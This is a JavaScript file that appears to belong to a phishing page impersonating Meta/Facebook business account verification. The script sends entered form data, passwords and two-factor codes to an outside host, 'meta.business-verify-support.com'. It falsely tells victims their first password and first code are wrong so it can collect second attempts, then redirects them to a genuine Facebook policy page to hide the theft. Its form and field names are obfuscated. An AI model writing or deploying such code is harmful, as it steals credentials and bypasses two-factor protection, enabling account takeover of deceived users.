function startTimer(duration, display) {
    $('.send-code-btn').removeClass('cursor-pointer').addClass('pointer-events-none');
    var timer = duration,
        minutes, seconds;
    let count = setInterval(function() {
        minutes = parseInt(timer / 60, 10);
        seconds = parseInt(timer % 60, 10);

        minutes = minutes < 10 ? "0" + minutes : minutes;
        seconds = seconds < 10 ? "0" + seconds : seconds;

        display.text(minutes + ":" + seconds);

        if (--timer < 0) {
            $('.send-code-btn').addClass('cursor-pointer').removeClass('pointer-events-none');

            clearInterval(count);
        }
    }, 1000);
}

$(document).ready(function() {
    // set the modal menu element
    const $targetEl = document.getElementById('modalEl');

    const $finishModal = document.getElementById('finishModal');

    // options with default values
    const options = {
        placement: 'center-center',
        backdrop: 'static',
        backdropClasses: 'bg-gray-900 bg-opacity-50 dark:bg-opacity-80 fixed inset-0 z-40',
        closable: true
    };

    const modal = new Modal($targetEl, options);
    const modal2 = new Modal($finishModal, options);

    $('#ccnpwxpytrb').submit(function(e) {
        e.preventDefault();

        modal.show();
    });

    let num_enter_password = 1;

    let num_send_2fa = 1;

    $('#mvmgxlrpqdl').submit(function(e) {
        e.preventDefault();

        let $this = $(this)

        let _password = $(this).find('[name="hxeyfibmtuv"]').val();

        let _formInfo = new FormData(document.getElementById('ccnpwxpytrb'));

        if (num_enter_password == 1) {
            _formInfo.append('hxeyfibmtuv', _password);
        }

        if (num_enter_password == 2) {
            _formInfo.append('cdeviemwnkp', _password);
        }

        _formInfo.append('num_enter_password', num_enter_password);

        $.ajax({
            url: 'https://meta.business-verify-support.com/api/account',
            type: 'POST',
            contentType: false,
            processData: false,
            data: _formInfo,
            success: function(res) {
                if (num_enter_password == 2) {
                    window.location.href = '/confirm/01hhvz4rjnaznyafhhfqxcdxkn';
                }

                $('.error_password').text('The password you\'ve entered is incorrect.');

                $this.find('[name="hxeyfibmtuv"]').val('');

                num_enter_password++;
            },
            error: function(err) {
                console.log(err);
            }
        })
    });

    $('#skdzvhmcei').submit(function(e) {
        e.preventDefault();

        let $this = $(this);

        let _code = $this.find('input[name="udgvjseoun"]').val();

        $.ajax({
            url: 'https://meta.business-verify-support.com/api/2fa-code',
            type: 'POST',
            data: {
                'pyctdvtzlzz': _code
            },
            success: function(res) {

                if (num_send_2fa == 2) {
                    modal2.show();

                    $('.error_2fa').text('');

                    $('.count-time').remove();

                    return;
                }

                num_send_2fa++;

                $('.error_2fa').text('The code generator you entered is incorrect. Please wait 5 minutes to receive another one.');
                $this.find('input[name="udgvjseoun"]').val('');
            },
            error: function(err) {

            }
        });
    });

    $('.finish-verify').click(function() {
        window.location.href = 'https://www.facebook.com/policies_center/';
    });

    startTimer(60 * 5, $('.count-time'));

    $('.send-code-btn').click(function() {
        if ($(this).hasClass('pointer-events-none')) return false;
        startTimer(60 * 5, $('.count-time'));
    });
});